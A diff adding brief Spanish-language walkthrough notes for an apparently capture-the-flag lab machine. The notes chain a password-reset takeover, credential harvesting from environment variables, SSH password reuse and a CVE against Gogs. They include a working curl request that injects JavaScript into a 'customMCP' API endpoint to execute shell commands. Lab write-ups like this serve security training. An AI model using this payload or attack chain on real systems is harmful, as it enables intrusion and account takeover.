@@ -1,0 +1,25 @@
+* subdomain encontrado -> staging.silentium.htb
+
+* utiliza la recuperacion de contraseña rota con burpsuite para obtener el temptoken y utilizalo para forzar el cambio de contraseña para ben@silentium.htb
+
+* usando la sesion abierta forzada.gana rce con la siguiente pet
+
+  curl -X POST http://localhost:3000/api/v1/node-load-method/customMCP \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer <Nueva Api key creada por ti>" \
+    -d '{
+      "loadMethod": "listActions",
+      "inputs": {
+        "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo !!RCE-OK!! >/tmp/RCE.txt\");return 1;})()})"
+      }
+    }'
+
+* revisa los ENV de la bash para obtener contraseñas
+
+* reusa las contraseñas para ganar acceso SSH
+
+* caputra la user.txt y enumera los puertos
+
+* encuentra puerto sospechoso 3001
+
+* utiliza el CVE-2025-59528 para ganar RCE a traves de GOGS y ganar la root.txt
